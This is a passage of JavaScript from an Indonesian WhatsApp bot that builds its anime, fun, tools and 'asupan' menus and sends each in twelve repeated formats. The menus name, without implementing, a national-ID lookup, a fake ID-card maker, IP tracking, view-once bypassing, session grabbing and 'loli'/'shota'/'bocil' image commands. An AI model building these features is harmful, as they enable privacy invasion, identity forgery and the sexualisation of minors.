                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'animemenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *A N I M E - M E N U*
${simboltengah}
${global.tTeks}videoanime
${global.tTeks}quotesanime
${global.tTeks}otakudesu *query*
${global.tTeks}akira *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}akiyama *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}ana *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}asuna *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}ayuzawa *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}boruto *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}chiho *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}chitoge *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cosplayloli *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cosplaysagiri *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}deidara *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}doraemon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}elaina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}emilia *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}erza *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}gremory *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}hestia *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}hinata *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}husbu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}inori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}isuzu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}itachi *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}itori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kagachan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kagura *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kakasih *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kaori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}keneki *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kotori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kurumi *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}loli *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}madara *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}megumin *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}mikasa *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}mikey *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}miku *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}minato *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}naruto *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}neko *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}neko2 *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}nekonime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}nezuko *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}onepiece *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pokemon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}randomnime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}randomnime2 *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}rize *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}sagiri *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}sakura *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}sasuke *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shinka *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shinomiya *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shizuka *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shota *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tejina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}toukachan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tsunade *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}waifu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}animewall *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}yotsuba *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}yuki *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}yulibocil *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}yumeko *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}wallnime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${simbolbawah}
${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'funmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *F U N - M E N U*
${simboltengah}
${global.tTeks}stupidcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}handsomecheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}uncleancheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hotcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}smartcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}greatcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}evilcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}dogcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}coolcheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}waifucheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}awesomecheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gaycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cutecheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lesbiancheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hornycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}prettycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lovelycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}uglycheck *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}checkme *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}nomerhoki *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ᴀʀᴛɪɴᴀᴍᴀ *text*
${global.tTeks}ᴀʀᴛɪᴍɪᴍᴘɪ *text*
${global.tTeks}ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ *text*
${global.tTeks}ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ *text*
${global.tTeks}ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ *text*
${global.tTeks}ʀᴇᴊᴇᴋɪ *text*
${global.tTeks}ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ *text*
${global.tTeks}ᴘᴇᴋᴇʀᴊᴀᴀɴ *text*
${global.tTeks}ᴀʀᴛɪᴛᴀʀᴏᴛ *text*
${global.tTeks}ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ *text*
${global.tTeks}ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ *text*
${global.tTeks}ʜᴀʀɪꜱᴀɴɢᴀʀ *text*
${global.tTeks}ʜᴀʀɪʙᴀɪᴋ *text*
${global.tTeks}ꜰᴇɴɢꜱʜᴜɪ *text*
${global.tTeks}ɴᴀɢᴀʜᴀʀɪ *text*
${global.tTeks}ʜᴀʀɪɴᴀᴀꜱ *text*
${global.tTeks}ᴡᴇᴛᴏɴ *text*
${global.tTeks}ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ *text*
${global.tTeks}ᴀʀᴀʜʀᴇᴊᴇᴋɪ *text*
${global.tTeks}ꜱɪꜰᴀᴛ *text*
${global.tTeks}ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ *text*
${global.tTeks}ᴍᴇᴍᴀɴᴄɪɴɢ *text*
${global.tTeks}ᴍᴀꜱᴀꜱᴜʙᴜʀ *text*
${global.tTeks}ᴢᴏᴅɪᴀᴋ *text*
${global.tTeks}ꜱʜɪᴏ *text*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'toolsmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *T O O L S - M E N U*
${simboltengah}
${global.tTeks}ambilsesi
${global.tTeks}buka *reply ViewOnce*
${global.tTeks}bukavn *reply VoiceOnce*
${global.tTeks}blur *reply*
${global.tTeks}brightness *reply*
${global.tTeks}bypassouo *link Ouo*
${global.tTeks}bypassmiror *link Mirror*
${global.tTeks}coloring *reply|text*
${global.tTeks}cropshape *reply image*
${global.tTeks}chat *reply*
${global.tTeks}cekweb *link*
${global.tTeks}ceknik *NIK*
${global.tTeks}createbarcode *text*
${global.tTeks}createqr *text*
${global.tTeks}cekusia *reply*
${global.tTeks}cekresi *query*
${global.tTeks}chord *query*
${global.tTeks}createmail 
${global.tTeks}df *name file*
${global.tTeks}dbinary *text*
${global.tTeks}dns *query*
${global.tTeks}darkness *reply Image*
${global.tTeks}detectface *reply Img*
${global.tTeks}detectqr *reply*
${global.tTeks}ebinary *text*
${global.tTeks}fetch *link*
${global.tTeks}file/berkas *text*
${global.tTeks}fliptext *text*
${global.tTeks}gi *name file*
${global.tTeks}grup-wa *text*
${global.tTeks}getfps *reply video*
${global.tTeks}invert *reply*
${global.tTeks}ktpmaker *text*
${global.tTeks}lacakip *ip*
${global.tTeks}once *reply*
${global.tTeks}ocr *reply Image*
${global.tTeks}openvonce *reply*
${global.tTeks}readmore *text*
${global.tTeks}reversevid *reply Vid*
${global.tTeks}readbarcode *reply*
${global.tTeks}resize *reply*
${global.tTeks}resolution *reply*
${global.tTeks}sf
${global.tTeks}snobg *reply*
${global.tTeks}shortlink *link*
${global.tTeks}ssweb *link*
${global.tTeks}ssphone *link*
${global.tTeks}styletext *text*
${global.tTeks}subfinder *text*
${global.tTeks}tts *text*
${global.tTeks}tts-tiktok *text*
${global.tTeks}vonce *reply Vn*
${global.tTeks}volaudio *reply audio*
${global.tTeks}volvideo *reply video*
${global.tTeks}webanalyzer *link*
${global.tTeks}webzip *link*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'asupanmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *A S U P A N - M E N U*
${simbolbawah}
${global.tTeks}ometv *creator only*
${global.tTeks}tiktokgirl *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktoknukthy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokkayes *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokpanrika *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktoknotnot *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokghea *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktoksantuy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokbocil *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokviral *premium only*
${global.tTeks}asupan *query*
${global.tTeks}asupan2
${global.tTeks}asupantiktok *query*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
